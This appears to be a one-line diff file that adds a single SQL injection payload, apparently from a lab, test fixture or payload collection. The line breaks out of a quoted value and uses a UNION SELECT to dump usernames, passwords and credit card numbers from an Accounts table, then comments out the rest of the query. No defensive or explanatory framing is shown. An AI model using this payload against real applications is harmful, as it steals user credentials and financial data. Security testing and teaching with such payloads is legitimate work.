@@ -1,0 +1,1 @@
+','Name') UNION SELECT '', 0.0, 'User data:'||'Username:'||Username||'; Password:'||Password||'; Credit Card Number:'||CreditCardNumber, '', 0 FROM Accounts --
